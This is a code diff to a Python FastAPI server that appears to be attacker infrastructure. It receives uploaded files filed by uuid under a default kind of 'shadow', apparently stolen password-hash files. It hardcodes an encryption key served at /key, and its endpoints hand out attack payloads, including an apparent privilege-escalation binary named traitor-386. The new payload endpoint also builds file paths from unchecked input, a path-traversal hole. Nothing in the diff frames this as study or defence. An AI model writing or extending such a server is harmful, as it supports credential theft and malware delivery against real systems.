@@ -9,6 +9,8 @@ import shutil
 import io
 import logging
 
+# set cwd to the directory of the script
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
 app = FastAPI()
 
 # encryption key:
@@ -16,7 +18,6 @@ encryption_key = "LunaLovesHackingHellYeah"
 
 logger = logging.getLogger('uvicorn.error')
 logger.setLevel(logging.DEBUG)
-
 
 # Pydantic model to accept the JSON structure with uuid and raw_file
 class RequestData(BaseModel):
@@ -27,13 +28,12 @@ class RequestData(BaseModel):
 # Helper function to save the file
 def save_file(uuid_str: str, raw_file_data: str, kind: str = "shadow"):
     # Create the directory if it doesn't exist
-    directory = f'./files/{kind}/{uuid_str}'
+    directory = f'./files/{uuid_str}/{kind}'
     os.makedirs(directory, exist_ok=True)
     
-    # Get the current timestamp for the filename
+    # Set file name and path
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     
-    # Decode the base64 data
     file_data = io.BytesIO(raw_file_data.encode('utf-8'))
     
     # Save the file with timestamped name
@@ -53,10 +53,21 @@ async def handle_test(request_data: RequestData):
     file_path = save_file(uuid_str, data, kind=kind)
     return {"message": "File saved successfully", "file_path": file_path}
 
-@app.get("/traitor-386")
-async def traitor():
+# defunct now thanks to modular payload api
+# @app.get("/traitor-386")
+# async def traitor():
+#     # return file
+#     return FileResponse("./traitor-386")
+
+@app.get("/payloads")
+async def get_payloads():
+    # return files in the payloads directory
+    return {"payloads": os.listdir("./payloads")}
+
+@app.get("/payloads/{payload_name}")
+async def get_payload(payload_name: str):
     # return file
-    return FileResponse("./traitor-386")
+    return FileResponse(f"./payloads/{payload_name}")
 
 @app.get("/key")
 async def get_key():
